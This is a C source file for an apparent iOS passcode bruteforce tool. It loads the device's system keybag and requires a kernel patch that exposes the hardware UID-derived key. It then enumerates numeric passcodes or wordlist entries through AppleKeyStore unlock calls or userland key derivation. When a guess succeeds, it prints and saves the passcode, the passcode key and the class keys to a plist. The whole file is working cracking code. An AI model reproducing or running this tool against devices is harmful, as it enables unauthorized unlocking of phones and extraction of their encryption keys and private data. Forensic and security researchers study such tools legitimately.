#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <CoreFoundation/CoreFoundation.h>
#include <sys/time.h>
#include <math.h>
#include "AppleKeyStore.h"
#include "IOKit.h"
#include "IOAESAccelerator.h"
#include "registry.h"
#include "util.h"
#include "device_info.h"
#include "remote_functions.h"
/*
 #define MobileKeyBagBase 0x354cb000
 
 CFDictionaryRef (*AppleKeyStore_loadKeyBag)(char*, char*) = MobileKeyBagBase + 0x50A8;
 int (*AppleKeyStoreKeyBagSetSystem)(int) = MobileKeyBagBase + 0x910;
 int (*AppleKeyStoreKeyBagCreateWithData)(CFDataRef, int*) = MobileKeyBagBase + 0xC88;
 */
/*
 /private/var/mobile/Library/ConfigurationProfiles/PublicInfo/EffectiveUserSettings.plist.plist
 plist["restrictedValue"]["passcodeKeyboardComplexity"]
 */

const char* def_prog = "/mnt1/private/etc/bruteforce.txt";

const size_t passcodeBuffSize = 100;

typedef int (*next_string_func)(void *ctx, char *out, size_t out_size);

typedef struct {
    next_string_func next;
    void *ctx;
} StringSequence;

typedef struct {
    FILE *fp;
} FileLineCtx;

typedef struct {
    long long current;
    long long max;
    int len;
    long long next10;
} PasscodeCtx;

int PasscodeCtx_init(PasscodeCtx *ctx, char *startCode, long long max) {
    size_t len = strlen(startCode);
    if (len < 1 || len > 99999999) {
        printf("length must be positive\n");
        return 1;
    }

    char *end;
    errno = 0;
    long long start = strtol(startCode, &end, 10);

    if (end == startCode || errno == ERANGE || *end != '\0') {
        printf("strtol failed\n");
        return 1;
    }

    if (max < start) {
        printf("max cannot be less than start\n");
        return 1;
    }

    int next10 = 1;
    for (int i = 0; i < len; i++) {
        next10 *= 10;
    }
    if (start >= next10) {
        printf("len is shorter than size of start\n");
        return 1;
    }

    ctx->current = start;
    ctx->max = max;
    ctx->len = (int)len;
    ctx->next10 = next10;
    return 0;
}

int next_passcode(void *vctx, char *out, size_t out_size)
{
    PasscodeCtx *ctx = (PasscodeCtx *)vctx;

    if (ctx->current >= ctx->max)
        return 0;

    int n = snprintf(out, out_size, "%0*lld", ctx->len, ctx->current);
    if (n < 0 || n >= out_size) {
        printf("not enough space in passcode buffer\n");
        return 0;
    }
    ctx->current++;
    if (ctx->current >= ctx->next10) {
        ctx->current = 0;
        ctx->next10 *= 10;
        ctx->len++;
    }

    return 1;
}

int next_file_line(void *vctx, char *out, size_t out_size)
{
    FileLineCtx *ctx = (FileLineCtx *)vctx;

    if (!ctx->fp)
        return 0;

    if (fgets(out, (int)out_size, ctx->fp) == NULL) {
        fclose(ctx->fp);
        return 0;
    }

    size_t len = strlen(out);
    while (len > 0 && (out[len - 1] == '\n' || out[len - 1] == '\r')) {
        out[len - 1] = '\0';
        len--;
    }

    return 1;
}

void saveKeybagInfos(CFDataRef kbkeys, KeyBag* kb, uint8_t* key835, char* passcode, uint8_t* passcodeKey, CFMutableDictionaryRef classKeys)
{
    CFMutableDictionaryRef out = device_info(-1, NULL);

    CFStringRef uuid = CreateHexaCFString(kb->uuid, 16);
    
    CFDictionaryAddValue(out, CFSTR("uuid"), uuid);
    CFDictionaryAddValue(out, CFSTR("KeyBagKeys"), kbkeys);
    
    addHexaString(out, CFSTR("salt"), kb->salt, 20);
    
    if (passcode != NULL)
    {
        CFStringRef cfpasscode = CFStringCreateWithCString(kCFAllocatorDefault, passcode, kCFStringEncodingASCII);
        CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
        CFRelease(cfpasscode);
    }
    if (passcodeKey != NULL)
        addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    
    if (key835 != NULL)
        addHexaString(out, CFSTR("key835"), key835, 16);
    if (classKeys != NULL)
        CFDictionaryAddValue(out, CFSTR("classKeys"), classKeys);

    CFStringRef resultsFileName = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("/mnt1/private/etc/%@.plist"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFStringRef printString = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("Writing results to %@.plist\n"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFShow(printString);
    CFRelease(printString);
    
    saveResults(resultsFileName, out);
    
    CFRelease(resultsFileName);
    CFRelease(uuid);
    CFRelease(out);

}

void print_status(char passcode[], int processed, struct timeval start) {
    struct timeval curr;
    gettimeofday(&curr, NULL);

    double elapsed =
        (curr.tv_sec - start.tv_sec) +
        (curr.tv_usec - start.tv_usec) / 1e6;

    double rate = (elapsed > 0) ? (processed / elapsed) : 0.0;

    printf(
        "Current: \"%s\". Processed: %d. Elapsed: %.2fs. Rate: %.2f passcodes/sec\n",
        passcode,
        processed,
        elapsed,
        rate
    );
}

char* bruteforceWithAppleKeyStore(CFDataRef kbkeys, StringSequence *seq, int statusEach)
{
    size_t passcodeSize = passcodeBuffSize;
    char passcode[passcodeSize];
    memset(passcode, 0, sizeof(passcode));

    uint64_t keybag_id = 0;

    if (AppleKeyStoreKeyBagInit()) {
        printf("AppleKeyStoreKeyBagInit() failed\n");
        return NULL;
    }
    if (AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id)) {
        printf("AppleKeyStoreKeyBagCreateWithData() failed\n");
        return NULL;
    }

    printf("keybag id=%x\n", (uint32_t) keybag_id);
    if (AppleKeyStoreKeyBagSetSystem(keybag_id)) {
        printf("AppleKeyStoreKeyBagSetSystem() failed\n");
        return NULL;
    }
    
    CFDataRef data = NULL;
    
    io_connect_t conn = IOKit_getConnect("AppleKeyStore");
    if (conn == -1) {
        printf("IOKit_getConnect() failed\n");
        return NULL;
    }

    struct timeval start;
    gettimeofday(&start, NULL);

    int processed = 0;
    while (seq->next(seq->ctx, passcode, passcodeSize)) {
        processed++;
        data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, (long)strlen(passcode), kCFAllocatorNull);
        if (data == NULL) {
            printf("CFDataCreateWithBytesNoCopy failed\n");
            return NULL;
        }
        if (!AppleKeyStoreUnlockDevice(conn, data))
        {
            printf("Success!: %s\n", passcode);
            return strdup(passcode);
        }
        if (processed % statusEach == 0) {
            print_status(passcode, processed, start);
        }
    }
    printf("No valid passcode found\n");
    return NULL;
}

char* bruteforceUserland(KeyBag* kb, uint8_t* key835, StringSequence* seq, int statusEach)
{
    size_t passcodeSize = passcodeBuffSize;
    char passcode[passcodeSize];
    memset(passcode, 0, sizeof(passcode));

    int processed = 0;
    
    struct timeval start;
    gettimeofday(&start, NULL);

    while (seq->next(seq->ctx, passcode, passcodeSize))
    {
        processed++;
        if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835)) {
            printf("Success!: %s\n", passcode);
            // return a copy
            return strdup(passcode);
        }

        if (processed % statusEach == 0) {
            print_status(passcode, processed, start);
        }
    }

    printf("\nNo valid passcode found\n");
    return NULL;
}


int main(int argc, char* argv[])
{
    int ret = 1;
    u_int8_t passcodeKey[32]={0};
    char* passcode = NULL;
    StringSequence* seq = NULL;
    int bruteforceMethod = 0;
    int showImages = 0;
    char *start = NULL;
    char *wordlist = NULL;
    int statusEach = 1;
    int c;
    KeyBag* kb = NULL;
    CFDictionaryRef kbdict = NULL;
    
    while ((c = getopt (argc, argv, "uir:w:p:")) != -1)
    {
        switch (c) {
            case 'u':
                bruteforceMethod = 1;
                break;
            case 'i':
                showImages = 1;
                break;
            case 'r':
                start = strdup(optarg);
                break;
            case 'w':
                wordlist = strdup(optarg);
                break;
            case 'p':
                statusEach = atoi(optarg);
                if (statusEach <= 0) {
                    statusEach = 1;
                }
                break;
            default:
                printf("Usage: %s [-u] [-i] [-r startPasscode] [-w -|wordlistPath] [-p progressEach]\n", argv[0]);
                goto cleanup;
        }
    }
    if (showImages && wordlist != NULL) {
        printf("cannot use both -i and -w flags\n");
        goto cleanup;
    }

    if (wordlist == NULL) {
        if (start == NULL) {
            start = strdup("0000");
        }
        PasscodeCtx ctx;
        if (PasscodeCtx_init(&ctx, start, 99999999)) {
            printf("Failed to initialize passcode context\n");
            goto cleanup;
        }
        seq = &(StringSequence){ .next = next_passcode, .ctx = &ctx};
    } else {
        seq = &(StringSequence){};
        FILE* fp = NULL;
        FileLineCtx ctx;
        if (strcmp(wordlist, "-") == 0) {
            fp = stdin;
        } else {
            fp = fopen(wordlist, "r");
            if (!fp) {
                printf("Unable to open wordlist");
                goto cleanup;
            }
        }

        ctx.fp = fp;
        seq->next = next_file_line;
        seq->ctx = &ctx;
        if (start != NULL) {
            char skippedPasscode[passcodeBuffSize];
            while (true) {
                if (!seq->next(seq->ctx, skippedPasscode, passcodeBuffSize)) {
                    printf("start passcode not found in wordlist\n");
                    goto cleanup;
                }
                if (strcmp(skippedPasscode, start) == 0) {
                    break;
                }
            }
        }
    }

    uint8_t* key835 = IOAES_key835();
    
    if (!memcmp(key835, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16))
    {
        printf("FAIL: missing UID kernel patch\n");
        goto cleanup;
    }
    
    kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    
    if (kbdict == NULL)
    {
        //mountDataPartition("/mnt2");
        
        kbdict = AppleKeyStore_loadKeyBag("/mnt2/keybags","systembag");
        if (kbdict == NULL)
        {
            printf("FAILed to load keybag\n");
            goto cleanup;
        }
    }
    
    CFDataRef kbkeys = CFDictionaryGetValue(kbdict, CFSTR("KeyBagKeys")); 
    
    if (kbkeys == NULL)
    {
        printf("FAIL: KeyBagKeys not found\n");
        goto cleanup;
    }
    //write_file("kbblob.bin", CFDataGetBytePtr(kbkeys), CFDataGetLength(kbkeys));    
    kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL)
    {
        printf("FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        goto cleanup;
    }
    
    //save all we have for now
    //saveKeybagInfos(kbkeys, kb, key835, NULL, NULL, NULL);
    
    int keyboardType = 0;
    CFDataRef opaque = CFDictionaryGetValue(kbdict, CFSTR("OpaqueStuff"));
    if (opaque != NULL)
    {
        CFPropertyListRef opq = CFPropertyListCreateWithData(kCFAllocatorDefault, opaque, kCFPropertyListImmutable, NULL, NULL);
        if (opq != NULL && CFGetTypeID(opq) == CFDictionaryGetTypeID())
        {
            CFNumberRef kt = CFDictionaryGetValue(opq, CFSTR("keyboardType"));
            CFNumberGetValue(kt, kCFNumberSInt32Type, &keyboardType);
            CFRelease(opq);
        }
    }

    /*
     * keyboard types
     * 0: "4 digits",
     * 1: "n digits",
     * 2: "n alphanum"
     */

    printf("keyboardType=%d\n", keyboardType);

    if (keyboardType == 0 && start != NULL && (strlen(start) < 4 || strlen(start) > 6)) {
        printf("Start password is too long or too short.\n");
        goto cleanup;
    }

    if (showImages == 0) {
        if (bruteforceMethod == 1) {
            printf("Bruteforcing using manual derivation\n");
            passcode = bruteforceUserland(kb, key835, seq, statusEach);
        } else {
            printf("Bruteforcing using Keystore\n");
            passcode = bruteforceWithAppleKeyStore(kbkeys, seq, statusEach);
        }
    } else {
        printf("Enter passcode: \n");
        passcode = malloc(passcodeBuffSize);
        fgets(passcode, (int)passcodeBuffSize-1, stdin);
        passcode[strlen(passcode)-1] = 0;
    }
    if (passcode != NULL)
    {
        if (!strcmp(passcode, ""))
            printf("No passcode set\n");

        if(!AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835))
        {
            printf("Invalid passcode: %s!\n", passcode);
        }
        else
        {
            printf("Found passcode : %s\n", passcode);
            AppleKeyStore_printKeyBag(kb);

            CFMutableDictionaryRef classKeys = AppleKeyStore_getClassKeys(kb);

            AppleKeyStore_getPasscodeKey(kb, passcode, strlen(passcode), passcodeKey);

            printf("Passcode key : ");
            printBytesToHex(passcodeKey, 32);
            printf("\n");

            printf("Key 0x835 : ");
            printBytesToHex(key835, 16);
            printf("\n");

            //save all we have for now
            saveKeybagInfos(kbkeys, kb, key835, passcode, passcodeKey, classKeys);
            CFRelease(classKeys);
	    ret = 0;
        }
    }

cleanup:
    CFRelease(kbdict);
    free(passcode);
    free(start);
    free(wordlist);
    free(kb);
    return ret;
}
